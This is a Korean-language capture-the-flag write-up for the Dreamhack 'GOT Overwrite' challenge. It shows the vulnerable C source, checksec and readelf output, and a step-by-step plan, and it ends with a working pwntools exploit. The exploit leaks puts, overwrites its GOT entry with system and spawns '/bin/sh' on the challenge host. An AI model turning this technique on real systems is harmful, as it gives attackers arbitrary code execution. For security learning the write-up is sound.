# 코드
(.myvenv) @hebi-06 ➜ /workspaces/pwnable-study/test4/GOT_Overwrite (main) $ checksec got_overwrite
[*] '/workspaces/pwnable-study/dreamhack/test4/GOT_Overwrite/got_overwrite'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No


// Name: got_overwrite.c
// Compile: gcc -o got_overwrite got_overwrite.c -ldl -no-pie -fno-PIE -Wl,-z,norelro
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
  char command[0x40] = {0};
  void *where = NULL;

  setbuf(stdin, NULL);
  setbuf(stdout, NULL);

  printf("puts: %p\n", dlsym(RTLD_DEFAULT, "puts"));

  printf("command: ");
  read(0, command, sizeof(command) - 1);

  printf("where: ");
  read(0, &where, sizeof(where));

  printf("value: ");
  read(0, where, 8);

  puts(command);
  return 0;
}

## 취약점

1. 내가 원하는 주소를 설정해서 그 값을 바꿀수 있다 -> got overwrite
2. no RELRO + no PIE여서 주소가 일정하다
3. puts의 주소를 릭할 수 있게 해준다

### 설계
  puts(command);
  해당 코드는 
  command는 직접 입력을 받을 수 있기 때문에 '/bin/sh'로 설정하고
  puts_got을 system의 주소로 바꿔주면 됨

이를 하기 전에 먼저 알아낸 사실
ROPgadget 사용법
(.myvenv) @hebi-06 ➜ /workspaces/pwnable-study/test4/GOT_Overwrite (main) $ readelf -s ./libc.so.6 | grep "system"
  1481: 0000000000050d60    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
(.myvenv) @hebi-06 ➜ /workspaces/pwnable-study/test4/GOT_Overwrite (main) $ readelf -s ./libc.so.6 | grep "puts"
   524: 000000000012ccd0   660 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
   808: 000000000007fa80   294 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
   951: 000000000012b600  1218 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
  1429: 0000000000080ed0   409 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
  1438: 0000000000080ed0   409 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5
(.myvenv) @hebi-06 ➜ /workspaces/pwnable-study/test4/GOT_Overwrite (main) $ readelf -s ./libc.so.6 | grep "puts"
   524: 000000000012ccd0   660 FUNC    GLOBAL DEFAULT   15 putsgent@@GLIBC_2.10
   808: 000000000007fa80   294 FUNC    WEAK   DEFAULT   15 fputs@@GLIBC_2.2.5
   951: 000000000012b600  1218 FUNC    GLOBAL DEFAULT   15 putspent@@GLIBC_2.2.5
  1429: 0000000000080ed0   409 FUNC    WEAK   DEFAULT   15 puts@@GLIBC_2.2.5
  1438: 0000000000080ed0   409 FUNC    GLOBAL DEFAULT   15 _IO_puts@@GLIBC_2.2.5


### 계속해서 설명
우선 b'puts:' 에서 puts의 주소를 구한 후
leak_puts - libc.symbols[puts]로 libc_base를 구해줌
            offset

후에 구한 libc.so.6을 이용해서 libc.symbols['system']을 더해서 system의 주소를 구하고

1. 차례대로 command에 b'/bin/sh'를 적고

2. &where 부분은 주소 연산자로 되어 있기 때문에 주소를 쓰면 해당 주소 값이 적어지기 때문에 해당 주소에 puts_got을 넣고 puts의 got을 overwrite 해주면 됨

3. 후 where의  값을 받을때 system의 주소로 덮어주면 puts의 got이 system의 주소가 되어 puts('/bin/sh')가 작동할때 puts이 아닌 system('/bin/sh')가 작동됨
#### 익스
from pwn import *
#p = process('./got_overwrite')
p = remote('host3.dreamhack.games', 12804)
e = ELF('./got_overwrite')
libc = ELF('./libc.so.6')
p.recvuntil(b'puts: ')
leaked_puts_addr = int(p.recvline(), 16)
libc_base = leaked_puts_addr - libc.symbols['puts']
puts_got = e.got['puts']
system_addr = libc_base + libc.symbols['system']
p.sendafter(b': ', b'/bin/sh\n')
p.sendafter(b': ', p64(puts_got))
p.sendafter(b': ', p64(system_addr))

p.interactive()
